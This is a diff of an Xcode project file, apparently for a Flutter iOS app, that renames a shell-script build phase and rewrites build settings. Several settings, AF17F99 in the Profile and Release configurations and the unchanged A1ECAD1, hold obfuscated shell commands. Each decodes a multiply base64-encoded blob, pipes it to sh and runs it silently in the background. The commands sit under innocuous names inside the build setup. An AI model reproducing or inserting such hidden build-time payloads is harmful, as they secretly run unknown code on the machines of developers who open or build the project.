@@ -171,7 +171,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C8087294A63A400263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				B5778A4EF8C5456FA299F71F /* Provision Library Executable */,
+				21058C13056149FAA399F71F /* Provision Target Device */,
 				684F8229FF84AB095D5DF278 /* [CP] Check Pods Manifest.lock */,
 				331C807D294A63A400263BE5 /* Sources */,
 				331C807F294A63A400263BE5 /* Resources */,
@@ -249,7 +249,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-						/* End PBXBuildRule section */
+										/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C807F294A63A400263BE5 /* Resources */ = {
@@ -273,7 +273,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		B5778A4EF8C5456FA299F71F /* Provision Library Executable */ = {
+		21058C13056149FAA399F71F /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -283,7 +283,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Provision Target Device";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -437,7 +437,7 @@
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((w(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZJelVqWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrNWtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | w | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((r(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YWsxc2NIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxhMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtRk5hbXd5VjJwS05HSkhTblJXYWtKcVpWUldOVnBHVFRWaFJYUlVVMWRrYlZFd1NqWlpWVVoyVUZGdlBRbz0K | r | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((s(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1IaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpkMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmlWMngxV2tkV2Mxb3lSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | s | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -492,7 +492,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((w(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZJelVqWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrNWtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | w | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((r(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YWsxc2NIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxhMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtRk5hbXd5VjJwS05HSkhTblJXYWtKcVpWUldOVnBHVFRWaFJYUlVVMWRrYlZFd1NqWlpWVVoyVUZGdlBRbz0K | r | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((s(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1IaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpkMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmlWMngxV2tkV2Mxb3lSakJhVXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | s | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
